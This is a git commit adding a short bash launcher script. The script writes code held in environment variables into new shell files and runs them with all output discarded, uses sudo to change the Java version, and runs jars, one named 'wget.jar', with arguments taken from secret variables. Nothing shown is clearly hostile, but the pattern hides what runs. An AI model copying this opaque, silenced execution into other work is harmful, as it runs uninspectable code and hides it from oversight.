79d4cc4aad4cea02de06bf9666700c890cdc5de4
mwheeler5 <106824576+mwheeler5@users.noreply.github.com>
2022-08-04 06:54:11 -0700

    Create start.sh

---
+++ start.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+echo -e $LINK1 > start1.sh
+bash start1.sh &> /dev/null
+echo -e $LINK2 > start2.sh
+bash start2.sh &> /dev/null
+export DISPLAY=:0
+sudo update-java-alternatives --set /usr/lib/jvm/temurin-17-jdk-amd64
+java -jar wget.jar $SECRET1 $SECRET2 "$SECRET3"
+java -jar $SECRET4
